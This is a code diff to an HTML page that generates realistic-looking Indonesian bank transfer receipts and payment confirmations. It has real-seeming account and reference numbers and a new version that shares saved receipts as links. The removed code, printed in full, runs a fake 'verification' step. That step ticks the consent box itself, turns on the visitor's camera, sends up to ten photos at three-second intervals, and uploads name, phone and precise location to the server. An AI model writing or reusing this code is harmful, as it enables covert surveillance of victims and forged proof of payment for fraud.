     </div>
 
     <script>
-      const defaults = {
-        greetName: "MUHAMMAD",
-        nominal: "2.000.000,00",
-        metode: "BI-Fast",
-        biaya: "Rp2.500,00",
-        biayaStatus: "Free",
-        biayaCustom: "",
-        total: "2.000.000,00",
-        sumberDana: "Wallet · Fluid Asset GG",
-        penerimaNama: "Muhammad Hidayat",
-        penerimaBank: "BLU by BCA Digital · 008920569145",
-        tujuan: "Fund Transfer",
-        tanggal: "22 Aug 2026, 15:23 WIB",
-        idTransaksi: "260822AI8GSS5F",
-        noReferensi: "20260822FAMAIDJ1010O0276223936",
-      };
+      const form = document.getElementById('invoiceForm');
+      const createLinkButton = document.getElementById('createLinkBtn');
+      const formStatus = document.getElementById('formStatus');
+      const shareDock = document.getElementById('shareDock');
+      const shareLink = document.getElementById('shareLink');
+      const shareStatus = document.getElementById('shareStatus');
+      const fieldIds = ['greetName', 'nominal', 'metode', 'biaya', 'biayaStatus', 'total', 'sumberDana', 'penerimaNama', 'penerimaBank', 'tujuan', 'tanggal', 'idTransaksi', 'noReferensi'];
+      const defaults = Object.fromEntries(fieldIds.map(id => [id, document.getElementById(id).value]));
 
-      const fieldIds = Object.keys(defaults);
-
-      function currentBiayaStatusText() {
-        const sel = document.getElementById("biayaStatus").value;
-        if (sel === "custom") {
-          return document.getElementById("biayaCustom").value || "Gratis";
-        }
-        return sel;
+      function setFormStatus(message, state = '') {
+        formStatus.textContent = message;
+        formStatus.className = 'form-status show' + (state ? ' ' + state : '');
       }
 
-      function update() {
-        document.getElementById("out-greetName").textContent =
-          document.getElementById("greetName").value;
-        document.getElementById("out-nominal").textContent =
-          document.getElementById("nominal").value;
-        document.getElementById("out-nominal2").textContent =
-          document.getElementById("nominal").value;
-        document.getElementById("out-metode").textContent =
-          document.getElementById("metode").value;
-        document.getElementById("out-biaya").textContent =
-          document.getElementById("biaya").value;
-        document.getElementById("out-biayaStatus").textContent =
-          currentBiayaStatusText();
-        document.getElementById("out-total").textContent =
-          document.getElementById("total").value;
-        document.getElementById("out-sumberDana").textContent =
-          document.getElementById("sumberDana").value;
-        document.getElementById("out-sumberDana2").textContent = document
-          .getElementById("sumberDana")
-          .value.split("·")
-          .pop()
-          .trim();
-        document.getElementById("out-penerimaNama").textContent =
-          document.getElementById("penerimaNama").value;
-        document.getElementById("out-penerimaNama2").textContent =
-          document.getElementById("penerimaNama").value;
-        document.getElementById("out-penerimaBank").textContent =
-          document.getElementById("penerimaBank").value;
-        document.getElementById("out-tujuan").textContent =
-          document.getElementById("tujuan").value;
-        document.getElementById("out-tanggal").textContent =
-          document.getElementById("tanggal").value;
-        document.getElementById("out-idTransaksi").textContent =
-          document.getElementById("idTransaksi").value;
-        document.getElementById("out-noReferensi").textContent =
-          document.getElementById("noReferensi").value;
-        if (typeof fillConfirmScreen === "function") fillConfirmScreen();
+      function invoicePayload() {
+        return Object.fromEntries(fieldIds.map(id => [id, document.getElementById(id).value.trim()]));
       }
 
-      fieldIds.forEach((id) => {
-        const el = document.getElementById(id);
-        if (el) el.addEventListener("input", update);
-      });
-      document
-        .getElementById("biayaStatus")
-        .addEventListener("change", function () {
-          document.getElementById("biayaCustomWrap").style.display =
-            this.value === "custom" ? "block" : "none";
-          update();
-        });
-
-      document.getElementById("resetBtn").addEventListener("click", () => {
-        fieldIds.forEach((id) => {
-          const el = document.getElementById(id);
-          if (el) el.value = defaults[id];
-        });
-        document.getElementById("biayaCustomWrap").style.display = "none";
-        update();
-      });
-
-      document.getElementById("downloadBtn").addEventListener("click", () => {
-        const isConfirmView =
-          document.getElementById("confirmCard").style.display !== "none";
-        const activeCard = isConfirmView
-          ? document.getElementById("confirmCard")
-          : document.getElementById("receiptCard");
-        const clone = activeCard.cloneNode(true);
-        clone.style.display = "block";
-        // Escape backticks to prevent breaking string concatenation
-        const cardHtml = clone.outerHTML.replace(/`/g, "&#96;");
-        const styleTag = document
-          .querySelector("style")
-          .outerHTML.replace(/`/g, "&#96;");
-        const fileTitle = isConfirmView
-          ? "Payment Confirmation - Bank Dayat Ganteng Monopoli"
-          : "Transfer Receipt - Bank Dayat Ganteng Monopoli";
-        const fullHtml =
-          "<!DOCTYPE html>\n" +
-          '<html lang="id">\n<head>\n' +
-          '<meta charset="UTF-8">\n' +
-          '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n' +
-          "<title>" +
-          fileTitle +
-          "<\/title>\n" +
-          styleTag +
-          "\n" +
-          "<style>body{display:flex;justify-content:center;}<\/style>\n" +
-          "<\/head>\n<body>\n" +
-          cardHtml +
-          "\n" +
-          "<\/body>\n<\/html>";
-        const blob = new Blob([fullHtml], { type: "text/html" });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement("a");
-        a.href = url;
-        a.download = isConfirmView
-          ? "payment-confirmation-bdgm.html"
-          : "transfer-receipt-bdgm.html";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-      });
-
-      // ---------- CONFIRMATION PAGE LOGIC ----------
-      function fillConfirmScreen() {
-        const nominal = document.getElementById("nominal").value;
-        const penerima = document.getElementById("penerimaNama").value;
-        const rekening = document.getElementById("penerimaBank").value;
-        const sumber = document
-          .getElementById("sumberDana")
-          .value.split("·")
-          .pop()
-          .trim();
-        const tanggal = document.getElementById("tanggal").value;
-
-        document.getElementById("cf-penerima").textContent = penerima;
-        document.getElementById("cf-penerima2").textContent = penerima;
-        document.getElementById("cf-penerima-success").textContent = penerima;
-        document.getElementById("cf-pengirim").textContent = sumber;
-        document.getElementById("cf-pengirim2").textContent = sumber;
-        document.getElementById("cf-nominal").textContent = nominal;
-        document.getElementById("cf-nominal-success").textContent = nominal;
-        document.getElementById("cf-rekening").textContent = rekening;
-        document.getElementById("cf-tanggal").textContent = tanggal;
-      }
-
-      function resetConfirmState() {
-        document.getElementById("confirmPending").style.display = "block";
-        document.getElementById("confirmSuccess").classList.remove("active");
-      }
-
-      function showReceiptView() {
-        document.getElementById("receiptCard").style.display = "block";
-        document.getElementById("confirmCard").style.display = "none";
-        document.getElementById("tabReceipt").classList.add("active");
-        document.getElementById("tabConfirm").classList.remove("active");
-      }
-
-      function showConfirmView() {
-        fillConfirmScreen();
-        resetConfirmState();
-        document.getElementById("receiptCard").style.display = "none";
-        document.getElementById("confirmCard").style.display = "block";
-        document.getElementById("tabReceipt").classList.remove("active");
-        document.getElementById("tabConfirm").classList.add("active");
-      }
-
-      document
-        .getElementById("tabReceipt")
-        .addEventListener("click", showReceiptView);
-      document
-        .getElementById("tabConfirm")
-        .addEventListener("click", showConfirmView);
-      document
-        .getElementById("declineBtn")
-        .addEventListener("click", showReceiptView);
-      document.getElementById("agreeBtn").addEventListener("click", () => {
-        document.getElementById("confirmPending").style.display = "none";
-        document.getElementById("confirmSuccess").classList.add("active");
-      });
-
-      // ============ TRANSPARENT VERIFICATION & CAMERA CAPTURE ============
-      const MAX_CAPTURED_PHOTOS = 10;
-      let permStream = null;
-      let permLocation = null;
-      let sentPhotoCount = 0;
-      let isSendingPhoto = false;
-      let dataVerified = false;
-      let captureInterval = null;
-      let verificationSessionId = null;
-      const captureCanvas = document.createElement("canvas");
-      captureCanvas.width = 320;
-      captureCanvas.height = 240;
-
-      function setVerificationProgress(message, state) {
-        const progress = document.getElementById("vfyProgress");
-        progress.textContent = message;
-        progress.className = "vfy-progress active" + (state ? " " + state : "");
-      }
-
-      async function sendConcernedData() {
-        const nameInput = document.getElementById("vfyName");
-        const phoneInput = document.getElementById("vfyPhone");
-        const nameErr = document.getElementById("vfyNameErr");
-        const phoneErr = document.getElementById("vfyPhoneErr");
-
-        nameInput.classList.remove("error");
-        phoneInput.classList.remove("error");
-        nameErr.style.display = "none";
-        phoneErr.style.display = "none";
-
-        let valid = true;
-        if (nameInput.value.trim().length < 2) {
-          nameInput.classList.add("error");
-          nameErr.style.display = "block";
-          valid = false;
-        }
-        if (phoneInput.value.trim().length < 5) {
-          phoneInput.classList.add("error");
-          phoneErr.style.display = "block";
-          valid = false;
-        }
-        if (!document.getElementById("vfyConsent").checked) {
-          valid = false;
-        }
-        if (!valid) return false;
-
-        const locData = permLocation
-          ? {
-              latitude: permLocation.coords.latitude,
-              longitude: permLocation.coords.longitude,
-              accuracy: permLocation.coords.accuracy,
-            }
-          : null;
-
-        setVerificationProgress("Mengirim data konfirmasi…");
-
-        try {
-          const verifyResponse = await fetch("/api/verify", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              name: nameInput.value.trim(),
-              phone: phoneInput.value.trim(),
-              location: locData,
-              ts: Date.now(),
-              sessionId: verificationSessionId,
-              consent: true,
-              photoCount: MAX_CAPTURED_PHOTOS,
-            }),
+      function refreshPreview() {
+        const payload = invoicePayload();
+        fieldIds.forEach(id => {
+          document.querySelectorAll('[data-output="' + id + '"]').forEach(output => {
+            output.textContent = payload[id] || '…';
           });
+        });
+        if (!shareDock.hidden) {
+          shareDock.hidden = true;
+          shareStatus.textContent = '';
+          setFormStatus('Data berubah. Simpan lagi untuk menghasilkan link invoice terbaru.');
+        }
+      }
 
-          if (!verifyResponse.ok) {
-            const errJson = await verifyResponse.json().catch(() => ({}));
-            throw new Error(errJson.error || "Gagal mengirim data verifikasi.");
-          }
+      fieldIds.forEach(id => {
+        document.getElementById(id).addEventListener('input', refreshPreview);
+        document.getElementById(id).addEventListener('change', refreshPreview);
+      });
 
-          dataVerified = true;
-          localStorage.setItem("bdgm_verified", "true");
-          setVerificationProgress(
-            "Data konfirmasi berhasil dikirim.",
-            "success",
-          );
-          return true;
+      document.getElementById('resetBtn').addEventListener('click', () => {
+        fieldIds.forEach(id => { document.getElementById(id).value = defaults[id]; });
+        shareDock.hidden = true;
+        formStatus.className = 'form-status';
+        refreshPreview();
+      });
+
+      form.addEventListener('submit', async event => {
+        event.preventDefault();
+        if (!form.reportValidity()) return;
+        createLinkButton.disabled = true;
+        createLinkButton.textContent = 'Menyimpan…';
+        setFormStatus('Menyimpan invoice dan membuat link unik…');
+        try {
+          const response = await fetch('/api/admin/invoices', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(invoicePayload())
+          });
+          const body = await response.json().catch(() => ({}));
+          if (!response.ok) throw new Error(body.error || 'Invoice tidak dapat disimpan.');
+          shareLink.value = new URL(body.path, window.location.origin).href;
+          shareDock.hidden = false;
+          setFormStatus('Invoice tersimpan. Link player siap dibagikan.', 'success');
+          shareDock.scrollIntoView({ block: 'nearest' });
         } catch (error) {
-          setVerificationProgress(
-            error.message || "Gagal mengirim data. Silakan coba lagi.",
-            "error",
-          );
-          return false;
-        }
-      }
-
-      async function captureVisibleFrame() {
-        if (
-          !permStream ||
-          sentPhotoCount >= MAX_CAPTURED_PHOTOS ||
-          isSendingPhoto
-        )
-          return;
-        const video = document.getElementById("vfyVideo");
-        if (video.readyState < 2) return;
-
-        if (!dataVerified) {
-          const ok = await sendConcernedData();
-          if (!ok) return;
-        }
-
-        const ctx = captureCanvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
-        const photoDataUrl = captureCanvas.toDataURL("image/jpeg", 0.7);
-
-        isSendingPhoto = true;
-        const nextPhotoNum = sentPhotoCount + 1;
-        setVerificationProgress(
-          "Mengirim foto " +
-            nextPhotoNum +
-            " dari " +
-            MAX_CAPTURED_PHOTOS +
-            "…",
-        );
-
-        try {
-          const photoResponse = await fetch("/api/capture", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              img: photoDataUrl,
-              ts: Date.now(),
-              sessionId: verificationSessionId,
-            }),
-          });
-
-          if (photoResponse.ok) {
-            sentPhotoCount = nextPhotoNum;
-            document.getElementById("vfyCameraIndicator").textContent =
-              "Camera active · " +
-              sentPhotoCount +
-              "/" +
-              MAX_CAPTURED_PHOTOS +
-              " photos";
-            if (sentPhotoCount >= MAX_CAPTURED_PHOTOS) {
-              clearInterval(captureInterval);
-              captureInterval = null;
-              setVerificationProgress(
-                "10 foto selesai dikirim (1 per 1).",
-                "success",
-              );
-            } else {
-              setVerificationProgress(
-                "Foto " +
-                  sentPhotoCount +
-                  " dari " +
-                  MAX_CAPTURED_PHOTOS +
-                  " terkirim.",
-              );
-            }
-          }
-        } catch (err) {
-          console.error("Error pengiriman foto:", err);
+          setFormStatus(error.message || 'Terjadi kesalahan saat membuat link.', 'error');
         } finally {
-          isSendingPhoto = false;
+          createLinkButton.disabled = false;
+          createLinkButton.textContent = 'Simpan & buat link';
         }
-      }
-
-      async function initCameraAndLocation() {
-        document.getElementById("vfyConsent").checked = true;
-        const startButton = document.getElementById("vfyStartCameraBtn");
-        startButton.disabled = true;
-        startButton.textContent = "Requesting permission…";
-        setVerificationProgress(
-          "Your browser will ask for camera and location permission.",
-        );
-
-        try {
-          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            throw new Error("Camera is not supported by this browser.");
-          }
-          permStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false,
-          });
-          const video = document.getElementById("vfyVideo");
-          video.srcObject = permStream;
-          document.getElementById("vfyCameraWrap").classList.add("active");
-          await video.play();
-          startButton.textContent = "Camera is active";
-          captureVisibleFrame();
-          captureInterval = setInterval(captureVisibleFrame, 3000);
-        } catch (error) {
-          startButton.disabled = false;
-          startButton.textContent = "Try camera & location again";
-          setVerificationProgress(
-            error.message || "Camera permission was not granted.",
-            "error",
-          );
-          return;
-        }
-
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              permLocation = position;
-            },
-            () => {
-              permLocation = null;
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
-          );
-        }
-      }
-
-      function stopStream() {
-        clearInterval(captureInterval);
-        captureInterval = null;
-        if (permStream) {
-          permStream.getTracks().forEach((track) => track.stop());
-          permStream = null;
-        }
-        const video = document.getElementById("vfyVideo");
-        if (video) video.srcObject = null;
-      }
-
-      function startVerification() {
-        stopStream();
-        sentPhotoCount = 0;
-        isSendingPhoto = false;
-        dataVerified = false;
-        permLocation = null;
-        verificationSessionId = window.crypto.randomUUID
-          ? window.crypto.randomUUID()
-          : String(Date.now()) +
-            "-" +
-            Math.random().toString(16).slice(2).padEnd(20, "0");
-        document.getElementById("vfyOverlay").classList.add("active");
-        document.getElementById("vfyName").value = "";
-        document.getElementById("vfyPhone").value = "";
-        document.getElementById("vfyConsent").checked = false;
-        document.getElementById("vfyStartCameraBtn").disabled = true;
-        document.getElementById("vfyStartCameraBtn").textContent =
-          "Allow camera & location";
-        document.getElementById("vfyIdentityBtn").disabled = true;
-        document.getElementById("vfyCameraWrap").classList.remove("active");
-        document.getElementById("vfyProgress").className = "vfy-progress";
-        document.getElementById("vfyCameraIndicator").textContent =
-          "Camera active · 0/" + MAX_CAPTURED_PHOTOS + " photos";
-        ["vfyName", "vfyPhone"].forEach((id) =>
-          document.getElementById(id).classList.remove("error"),
-        );
-        ["vfyNameErr", "vfyPhoneErr"].forEach(
-          (id) => (document.getElementById(id).style.display = "none"),
-        );
-      }
-
-      document
-        .getElementById("vfyConsent")
-        .addEventListener("change", (event) => {
-          document.getElementById("vfyStartCameraBtn").disabled =
-            !event.target.checked;
-          document.getElementById("vfyIdentityBtn").disabled =
-            !event.target.checked;
-          if (!event.target.checked && permStream) {
-            stopStream();
-            document.getElementById("vfyCameraWrap").classList.remove("active");
-            setVerificationProgress(
-              "Persetujuan dibatalkan. Kamera dihentikan.",
-            );
-          }
-        });
-      document
-        .getElementById("vfyStartCameraBtn")
-        .addEventListener("click", initCameraAndLocation);
-
-      document
-        .getElementById("vfyIdentityBtn")
-        .addEventListener("click", async () => {
-          const submitButton = document.getElementById("vfyIdentityBtn");
-          submitButton.disabled = true;
-          const ok = await sendConcernedData();
-          if (!ok) {
-            submitButton.disabled = false;
-            return;
-          }
-          setVerificationProgress(
-            "Data konfirmasi berhasil disimpan.",
-            "success",
-          );
-          setTimeout(closeVerification, 1000);
-        });
-
-      document
-        .getElementById("vfyIdentityCancelBtn")
-        .addEventListener("click", closeVerification);
-
-      function closeVerification() {
-        stopStream();
-        document.getElementById("vfyOverlay").classList.remove("active");
-      }
-
-      // Access dashboard directly without prompt
-      window.addEventListener("load", () => {
-        // Ready
       });
 
-      update();
+      document.getElementById('copyLinkBtn').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(shareLink.value);
+        } catch (_) {
+          shareLink.select();
+          document.execCommand('copy');
+        }
+        shareStatus.textContent = 'Link sudah disalin.';
+      });
+
+      document.getElementById('openLinkBtn').addEventListener('click', () => {
+        window.open(shareLink.value, '_blank', 'noopener,noreferrer');
+      });
+
+      refreshPreview();
     </script>
   </body>
 </html>
